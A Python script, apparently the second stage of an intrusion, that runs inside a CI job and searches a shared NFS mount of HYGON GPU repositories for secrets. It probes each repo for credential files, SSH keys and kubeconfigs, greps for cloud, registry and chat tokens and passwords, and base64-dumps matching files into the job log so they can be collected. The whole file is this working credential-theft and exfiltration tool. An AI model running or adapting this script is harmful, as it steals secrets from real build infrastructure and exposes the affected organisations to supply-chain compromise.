#!/usr/bin/env python3
# i8600 stage 2 - targeted, bounded read-only deep read of the rw /ci_public NFS share.
# Stage 1 showed the share holds CI workspaces for 26 HYGON GPU repos plus ci-images,
# hcu-ci and quality-gate dirs, and that dumping build artifacts exhausts the job-log
# budget. This pass prunes build/coverage trees, checks the highest-value CI paths in
# every top-level repo, then greps/prunes by priority with short numeric labels so the
# whole output stays well under the runner log limit. Read-only; exits 1 after the dump.
import os
import stat
import re
import time
import base64
import hashlib
import sys

ROOT = "/ci_public"
CAP = 1_650_000
MAX_VISIT = 260_000
MAX_CAND = 45_000
MAX_DEPTH = 15
MAX_GREP = 1_500_000
READ_BUDGET = 420 * 1024 * 1024
B64_BUDGET = 800_000
B64_FILE_MAX = 260_000
DEADLINE = 720.0

used = [0]
t0 = time.monotonic()
paths = {}          # id -> rel path
next_id = [0]
stats = {'visited': 0, 'dirs': 0, 'cand': 0, 'read': 0, 'scanned': 0, 'hits': 0,
         'dumped': 0, 'b64': 0, 'deadline': False}

def emit(s=""):
    s = str(s)
    if used[0] >= CAP:
        return False
    room = CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    try:
        print(s, flush=True)
    except Exception:
        pass
    used[0] += len(s) + 1
    return True

def pid(rel):
    if rel in paths_by_path:
        return paths_by_path[rel]
    next_id[0] += 1
    i = "F%05d" % next_id[0]
    paths[i] = rel
    paths_by_path[rel] = i
    emit("P %s %s" % (i, rel))
    return i

def b64dump(data, rel, maxb=B64_FILE_MAX):
    if len(data) > maxb:
        return False
    if stats['b64'] + len(data) * 4 // 3 > B64_BUDGET:
        emit("BUDGET_DUMP %s %d" % (pid(rel), len(data)))
        return False
    i = pid(rel)
    h = hashlib.sha256(data).hexdigest()
    emit("S %s %d %s" % (i, len(data), h))
    b = base64.b64encode(data).decode()
    seq = 0
    for p in range(0, len(b), 700):
        if not emit("C %s %d %s" % (i, seq, b[p:p + 700])):
            return False
        seq += 1
    emit("E %s %s" % (i, h))
    stats['b64'] += len(data) * 4 // 3
    stats['dumped'] += 1
    return True

paths_by_path = {}

PAT = re.compile(
    rb"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_secret_access_key|aws_access_key_id|"
    rb"AIza[0-9A-Za-z_\-]{35}|-----BEGIN [A-Z0-9 ]{0,28}PRIVATE KEY-----|"
    rb"ghp_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|gho_[A-Za-z0-9]{30,}|"
    rb"glpat-[A-Za-z0-9_\-\.]{18,}|xox[baprs]-[A-Za-z0-9-]{10,}|"
    rb"npm_[A-Za-z0-9]{30,}|pypi-[A-Za-z0-9_\-]{30,}|hf_[A-Za-z0-9]{20,}|"
    rb"wandb_v1_[A-Za-z0-9_]{20,}|"
    rb"\"auths\"\s*:|HARBOR_(USERNAME|PASSWORD)|harbor[_-]?(password|token)|"
    rb"docker\s+login|helm\s+registry\s+login|devpi\s+(login|use)|"
    rb"index[-_]url\s*=\s*https?://[^\s]+:[^\s@]+@|"
    rb"client_secret\s*[=:]|(password|passwd|pwd)\s*[=:]\s*[\"']?[^\s\"'$<>]{6,}|"
    rb"(token|secret|api[_-]?key|access[_-]?key|secret[_-]?key)\s*[=:]\s*[\"']?[A-Za-z0-9_\-\./+=]{16,}|"
    rb"KUBECONFIG=|client-key-data|certificate-authority-data|"
    rb"BEGIN OPENSSH PRIVATE KEY|CI_REGISTRY_PASSWORD|NPM_TOKEN|"
    rb"SLACK_[A-Z_]*TOKEN|(LARK|FEISHU)_[A-Z_]*SECRET|\bSSH_(PASS|PASSWORD)|sshpass)", re.I)

CRED_NAME = re.compile(
    r"(^|/)(\.env(\.[A-Za-z0-9_.-]+)?|[^/]*\.env|\.git-credentials|\.netrc|\.npmrc|\.pypirc|"
    r"\.docker/config\.json|\.git/config|id_(rsa|ed25519|ecdsa|dsa)(\..*)?|"
    r"[^/]*\.(pem|key|p12|pfx|jks|keystore)|(kubeconfig|.*\.kubeconfig)|"
    r"[^/]*credentials[^/]*\.(json|db|yaml|yml|txt)|auth\.json|"
    r"application_default_credentials\.json|\.aws/(credentials|config)|"
    r"\.ssh/(config|id_[a-z0-9]+)|[^/]*(secret|token|password|passwd)[^/]*\.(txt|json|yaml|yml|env))$", re.I)

JENKINS_NAME = re.compile(
    r"(^|/)(Jenkinsfile[^/]*|[^/]*\.groovy|[^/]*jenkins[^/]*\.(xml|ya?ml)|"
    r"(jobs?|pipelines?)/[^/]*\.xml|config\.xml)$", re.I)

BUILD_NAME = re.compile(
    r"(^|/)(Dockerfile[^/]*|Containerfile[^/]*|[^/]*\.dockerfile|"
    r"[^/]*(harbor|registry|docker|login|build|deploy|install|push|release)[^/]*\.(sh|bash|py|ya?ml))$", re.I)

SH_NAME = re.compile(r"[^/]*\.(sh|bash)$", re.I)
YAML_NAME = re.compile(r"[^/]*(\.ya?ml|\.toml|\.cfg|\.ini|\.conf|Makefile|\.mk|\.spec)$", re.I)
LOG_NAME = re.compile(r"[^/]*\.(log|out|txt)$", re.I)

PRUNE = {"build", "_deps", "CMakeFiles", "node_modules", "__pycache__", "site-packages",
         "dist-info", "htmlcov", ".cache", ".mypy_cache", ".pytest_cache", ".tox",
         ".venv", "venv", "hcu-wheel-staging", "lost+found", "bazel-out"}
# .git is never descended (its config is captured in the explicit checks); .github is kept.

def pstr(p):
    try:
        return os.fsdecode(p)
    except Exception:
        return repr(p)

def rfile(path, maxb):
    try:
        st = os.stat(path)
        if not stat.S_ISREG(st.st_mode):
            return None
        if st.st_size > MAX_GREP:
            return None
        with open(path, "rb") as f:
            return f.read(maxb)
    except Exception:
        return None

try:
    host = os.uname().nodename
except Exception:
    host = "?"
emit("===I8600B-BEGIN %s host=%s job=%s run=%s===" % (
    time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), host,
    os.environ.get("GITHUB_JOB", "?"), os.environ.get("GITHUB_RUN_ID", "?")))
emit("### MOUNTS")
try:
    for line in open("/proc/mounts", "rb").read().decode("utf-8", "replace").splitlines():
        if "/ci_public" in line:
            emit("M " + line[:280])
except Exception:
    pass

if not os.path.isdir(ROOT):
    emit("### FATAL no /ci_public")
    emit("===I8600B-END===")
    sys.exit(1)

top = []
try:
    with os.scandir(ROOT) as it:
        for e in sorted(it, key=lambda x: x.name):
            top.append((pstr(e.name), e.path))
except Exception as e:
    emit("### TOP_ERR %s" % e)
emit("### TOPS %d" % len(top))

# ---------- Phase 1: explicit high-value existence checks per top-level repo ----------
emit("### CHECK")
CHECK_NAMES = [".env", ".env.local", ".env.prod", ".env.dev", ".git-credentials", ".netrc",
               ".npmrc", ".pypirc", ".docker/config.json", ".git/config", "Jenkinsfile",
               "Dockerfile", "Makefile", "kubeconfig", ".ssh/id_rsa", ".ssh/id_ed25519",
               "id_rsa", "id_ed25519", ".aws/credentials", "config.json", "credentials",
               ".buildkite", ".github/workflows", "ci", "scripts/ci", "docker", "deploy",
               "harbor-login.sh", "docker-login.sh", "build.sh"]
for name, path in top:
    try:
        st = os.stat(path)
        if stat.S_ISDIR(st.st_mode):
            pass
        else:
            continue
    except Exception:
        continue
    for cn in CHECK_NAMES:
        fp = os.path.join(path, cn)
        try:
            st = os.stat(fp)
        except Exception:
            continue
        if stat.S_ISDIR(st.st_mode):
            emit("X %s %s DIR" % (name, cn))
        else:
            emit("X %s %s %d" % (name, cn, st.st_size))
            if cn in (".git/config", ".git-credentials", ".env", ".env.local", ".env.prod",
                      ".netrc", ".npmrc", ".pypirc", ".docker/config.json", "kubeconfig") and st.st_size <= 131072:
                data = rfile(fp, 131072)
                if data is not None:
                    b64dump(data, fp[len(ROOT):])

# ---------- Phase 2: candidate collection walk (pruned) ----------
emit("### WALK")
cands = []          # (rel, size, prio, depth)
visited = 0
dirs = 0
truncated = [False]
stack = [(path, name, 0) for name, path in reversed(top) if os.path.isdir(path)]
while stack:
    d, topname, depth = stack.pop()
    if depth > MAX_DEPTH:
        continue
    try:
        entries = sorted(os.scandir(d), key=lambda e: e.name)
    except Exception:
        continue
    subdirs = []
    for e in entries:
        nm = pstr(e.name)
        p = pstr(e.path)
        visited += 1
        if visited >= MAX_VISIT:
            truncated[0] = True
            break
        try:
            st = e.stat(follow_symlinks=False)
        except Exception:
            continue
        if stat.S_ISDIR(st.st_mode):
            dirs += 1
            low = nm.lower()
            if low in PRUNE:
                continue
            if low == ".git":
                # never walk .git, but keep its config checked in phase 1
                continue
            subdirs.append((e.path, topname, depth + 1))
            continue
        if not stat.S_ISREG(st.st_mode):
            continue
        rel = p[len(ROOT):]
        base = nm
        prio = 0
        if CRED_NAME.search(rel):
            prio = 100
        elif JENKINS_NAME.search(rel):
            prio = 92
        elif BUILD_NAME.search(rel):
            prio = 88
        elif SH_NAME.search(base):
            prio = 78
        elif YAML_NAME.search(base):
            prio = 62
        elif LOG_NAME.search(base):
            prio = 30
        if prio:
            cands.append((rel, st.st_size, prio, depth))
            if len(cands) >= MAX_CAND:
                truncated[0] = True
                break
    for sd in reversed(subdirs):
        stack.append(sd)
    if len(cands) >= MAX_CAND or visited >= MAX_VISIT:
        break

emit("### CAND visited=%d dirs=%d cands=%d truncated=%s elapsed=%.1fs" % (
    visited, dirs, len(cands), truncated[0], time.monotonic() - t0))
from collections import Counter
cc = Counter(c[0].split('/')[1] for c in cands if c[0].count('/') >= 2)
emit("### CAND_TOPS " + " ".join("%s:%d" % (k, v) for k, v in sorted(cc.items())))

# ---------- Phase 3: prioritized read / grep / dump ----------
cands.sort(key=lambda x: (-x[2], x[1], x[0]))
emit("### HITS")
broke = False
for (rel, size, prio, depth) in cands:
    if time.monotonic() - t0 > DEADLINE:
        stats['deadline'] = True
        emit("### DEADLINE")
        break
    if size > MAX_GREP:
        emit("SKIP_BIG %s %d" % (pid(rel), size))
        continue
    if stats['read'] + size > READ_BUDGET:
        emit("### READ_BUDGET")
        broke = True
        break
    data = rfile(ROOT + rel, MAX_GREP)
    if data is None:
        continue
    stats['read'] += len(data)
    stats['scanned'] += 1
    hits = []
    for i, line in enumerate(data.splitlines()):
        if len(line) > 3000:
            line = line[:3000]
        if PAT.search(line):
            txt = line.strip().lower()
            if any(s in txt for s in (b"example", b"your_", b"changeme", b"${{", b"xxxxx",
                                      b"placeholder", b"redacted", b"dummy", b"<token>",
                                      b"os.environ", b"getenv", b"process.env")) and \
               not re.search(rb"(AKIA|ASIA|BEGIN |ghp_|glpat-|\"auths\")", line):
                continue
            hits.append((i + 1, line[:400]))
            if len(hits) >= 10:
                break
    if hits:
        stats['hits'] += len(hits)
        i_id = pid(rel)
        for (ln, line) in hits:
            try:
                emit("H %s:%d %s" % (i_id, ln, base64.b64encode(line[:1200]).decode()))
            except Exception:
                pass
    do_dump = False
    if prio >= 100 and size <= B64_FILE_MAX:
        do_dump = True
    elif prio in (92, 88) and size <= 131072 and (hits or True):
        do_dump = True
    elif hits and size <= 131072:
        do_dump = True
    if do_dump:
        b64dump(data, rel)

emit("### STATS visited=%d dirs=%d cands=%d scanned=%d read=%d hits=%d dumped=%d b64=%d "
     "emitted=%d elapsed=%.1fs truncated=%s read_budget_hit=%s deadline=%s" % (
         visited, dirs, len(cands), stats['scanned'], stats['read'], stats['hits'],
         stats['dumped'], stats['b64'], used[0], time.monotonic() - t0, truncated[0],
         broke, stats['deadline']))
emit("===I8600B-END %s===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
sys.exit(1)
